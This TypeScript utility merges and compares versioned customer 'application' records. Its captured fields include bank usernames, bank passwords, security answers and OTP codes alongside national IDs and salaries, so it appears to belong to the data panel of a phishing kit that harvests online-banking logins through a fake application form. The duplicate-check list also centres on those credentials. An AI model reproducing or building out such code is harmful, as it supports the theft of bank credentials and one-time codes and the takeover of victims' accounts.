/**
 * Utility function for merging application version data
 * 
 * This function takes all versions of an application's data and merges them
 * field-by-field from newest to oldest, creating a unified data object
 * that contains ALL captured data from all steps.
 */

// All fields that can be captured from the customer
const ALL_DATA_FIELDS = [
  // Personal Data fields
  "fullName",
  "phone",
  "email",
  "nationalId",
  "monthlySalary",
  "employer",
  "city",
  "maritalStatus",
  "dateOfBirth",
  // Business data fields
  "companyName",
  "businessType",
  "commercialRegistration",
  "employeeCount",
  "annualRevenue",
  "contactName",
  // Bank data fields
  "bankName",
  "bankUsername",
  "bankPassword",
  "securityAnswer",
  // OTP and Status fields
  "otpCode",
  "currentStep",
  "status",
] as const;

export type DataField = typeof ALL_DATA_FIELDS[number];

export interface VersionData {
  id: number;
  version: number;
  isLatest: boolean;
  createdAt: string;
  [key: string]: unknown;
}

/**
 * Merges data from all versions, with newer versions taking precedence
 * over older ones for the same field.
 * 
 * @param versions - Array of version objects, should be sorted newest to oldest
 * @returns A merged object containing all data from all versions
 */
export function mergeVersionsData<T extends VersionData>(versions: T[]): Partial<Record<DataField, string>> {
  // Start with empty object
  const merged: Partial<Record<DataField, string>> = {};
  
  // Iterate through versions from newest to oldest
  // (versions array should already be sorted this way from API)
  for (const version of versions) {
    for (const field of ALL_DATA_FIELDS) {
      // If this field doesn't have a value yet in merged object,
      // and this version has a value for it, add it
      if (merged[field] === undefined && version[field] !== undefined && version[field] !== null) {
        merged[field] = String(version[field]);
      }
    }
  }
  
  return merged;
}

/**
 * Gets the latest value for a specific field across all versions
 * 
 * @param versions - Array of version objects
 * @param field - The field name to get the latest value for
 * @returns The latest non-empty value for the field, or undefined
 */
export function getLatestFieldValue<T extends VersionData>(
  versions: T[],
  field: DataField
): string | undefined {
  // Iterate from newest to oldest
  for (const version of versions) {
    if (version[field] !== undefined && version[field] !== null && version[field] !== "") {
      return String(version[field]);
    }
  }
  return undefined;
}

/**
 * Returns the merged data plus version metadata
 */
export function getMergedDataWithMeta<T extends VersionData>(versions: T[]) {
  const merged = mergeVersionsData(versions);
  const latestVersion = versions.find(v => v.isLatest) || versions[0];
  const totalVersions = versions.length;
  
  return {
    data: merged,
    latestVersionNumber: latestVersion?.version || 1,
    totalVersions,
    latestVersionId: latestVersion?.id,
    latestCreatedAt: latestVersion?.createdAt,
  };
}

// Fields to check for duplicates between versions
const DUPLICATE_CHECK_FIELDS = [
  "fullName", "phone", "email", "nationalId",
  "bankName", "bankUsername", "bankPassword",
  "otpCode"
] as const;

/**
 * Checks if there are actual duplicate data across versions
 * Returns true only if the same field has different values in different versions
 * This indicates that showing "older versions" is meaningful
 */
export function hasDuplicateData<T extends VersionData>(versions: T[]): boolean {
  if (versions.length < 2) return false;
  
  const latestVersion = versions.find(v => v.isLatest) || versions[0];
  const olderVersions = versions.filter(v => !v.isLatest);
  
  if (olderVersions.length === 0) return false;
  
  // Count how many fields have different values across versions
  let duplicateCount = 0;
  
  for (const field of DUPLICATE_CHECK_FIELDS) {
    const latestValue = latestVersion[field];
    for (const older of olderVersions) {
      const olderValue = older[field];
      // If both have values and they're different, it's a duplicate
      if (latestValue && olderValue && latestValue !== olderValue) {
        duplicateCount++;
        break; // Only count once per field
      }
    }
  }
  
  // Require at least 2 different fields to show "older versions"
  return duplicateCount >= 2;
}
